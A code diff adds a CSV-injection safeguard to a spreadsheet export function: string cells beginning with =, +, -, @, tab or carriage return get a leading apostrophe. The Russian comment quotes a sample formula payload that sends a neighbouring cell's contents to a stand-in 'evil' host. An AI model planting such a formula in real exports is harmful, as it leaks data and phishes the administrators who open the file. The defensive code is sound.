@@ -82,6 +82,22 @@ export function buildWorkbook<Row>(input: SpreadsheetInput<Row>): Buffer {
 }
 
 /**
+ * Защита от CSV-инъекции (OWASP «CSV Injection»). Кавычки CSV формулу не обезвреживают:
+ * Excel и LibreOffice исполняют ячейку, начатую с `= + - @` (а также с табуляции или
+ * возврата каретки), — и имя студента `=HYPERLINK("https://evil/?x="&A2;"…")` превращается
+ * у админа в фишинговую ссылку, утечку соседних ячеек или DDE. Такие строки получают
+ * ведущий апостроф: табличный редактор покажет текст как есть.
+ *
+ * Только строки: числа из колонок-счётчиков (в том числе отрицательные) — данные, а не
+ * текст пользователя. XLSX не задет — там строка пишется типом `s` и не исполняется.
+ */
+const FORMULA_START = /^[=+\-@\t\r]/
+function neutralizeFormula(value: string | number | boolean | null): string {
+  if (typeof value !== 'string') return String(value ?? '')
+  return FORMULA_START.test(value) ? `'${value}` : value
+}
+
+/**
  * CSV: только данные, без строк происхождения.
  *
  * В CSV нет листов, и любая подпись сверху оказалась бы прямо в таблице — то есть сломала
@@ -92,7 +108,7 @@ export function buildWorkbook<Row>(input: SpreadsheetInput<Row>): Buffer {
  */
 export function buildCsv<Row>(input: Pick<SpreadsheetInput<Row>, 'columns' | 'rows'>): string {
   const escape = (value: string | number | boolean | null): string =>
-    `"${String(value ?? '').replace(/"/g, '""')}"`
+    `"${neutralizeFormula(value).replace(/"/g, '""')}"`
   const lines = [
     input.columns.map((c) => escape(c.header)).join(','),
     ...input.rows.map((row) => input.columns.map((c) => escape(c.value(row))).join(',')),
